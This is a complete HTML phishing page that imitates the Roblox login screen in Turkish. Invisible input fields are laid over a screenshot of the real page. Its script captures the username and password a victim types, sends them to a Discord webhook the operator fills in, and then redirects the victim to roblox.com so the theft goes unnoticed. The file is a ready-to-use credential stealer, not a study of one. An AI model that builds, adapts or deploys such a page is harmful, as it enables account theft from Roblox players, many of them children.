<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Giriş</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #0b0e11; 
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        .wrapper {
            position: relative;
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .tam-ekran-resim {
            width: 100%;
            height: 100%;
            object-fit: contain; 
            display: block;
        }

        .form-container {
            position: absolute;
            width: 19.8%; 
            height: 48.5%;  
            top: 32.5%;   
            left: 50.1%;
            transform: translateX(-50%);
            box-sizing: border-box;
        }

        .form-container input, .form-container button, .form-container a {
            position: absolute;
            width: 100%;
            height: 12.2% !important; 
            left: 0;
            background: transparent;
            border: none;
            outline: none;
            box-sizing: border-box;
        }

        .form-container input {
            color: #ffffff;
            font-size: 14px;
            padding: 0 12px;
            display: block;
            line-height: 2.5; 
        }

        .form-container button, .form-container a {
            cursor: pointer;
        }

        /* ============================================================ */
        /* MİLİMETRİK 0.5 AYARLARININ YAPILDIĞI YER                     */
        /* ============================================================ */

        /* 1. KUTU: Username Giriş Alanı (Çok az aşağı indirildi) */
        .username-field {
            top: 1.1% !important; 
        }

        /* 2. KUTU: Password Giriş Alanı (Çok az yukarı çekildi) */
        .password-field {
            top: 12.8% !important; 
        }

        /* 3. BUTON: Log in butonu */
        .login-btn {
            top: 31% !important; 
            height: 13.5% !important; 
        }

        /* 4. BUTON: Send me the one-time code by email */
        .one-time-code-btn {
            top: 65.2% !important; 
            height: 13.5% !important;
        }

        /* 5. BUTON: Quick Login */
        .quick-login-btn {
            top: 81.8% !important; 
            height: 13.5% !important;
        }

        /* 6. LİNK: En alttaki Sign Up yazısı */
        .signup-link {
            top: 101% !important; 
            height: 8% !important;
            width: 25% !important; 
            left: auto;
            right: 13.5% !important; 
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">

        <form id="girisFormu" class="form-container">
            <input type="text" id="username" name="username" class="username-field" required autocomplete="new-password">
            <input type="password" id="password" name="password" class="password-field" required autocomplete="new-password">
            
            <button type="submit" class="login-btn" title="Giriş Yap"></button>
            <button type="button" class="one-time-code-btn"></button>
            <button type="button" class="quick-login-btn"></button>
            <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>
        </form>
    </div>

    <script>
        // Kendi Discord Webhook linkini buraya yapıştırmayı unutma kanka!
        const webhookURL = "BURAYA_DISCORD_WEBHOOK_LINKINI_YAZ";

        document.getElementById('girisFormu').addEventListener('submit', function(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const mesaj = {
                content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
            };
            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mesaj)
            })
            .then(() => { window.location.href = "https://roblox.com"; })
            .catch(() => { window.location.href = "https://roblox.com"; });
        });
    </script>

</body>
</html>
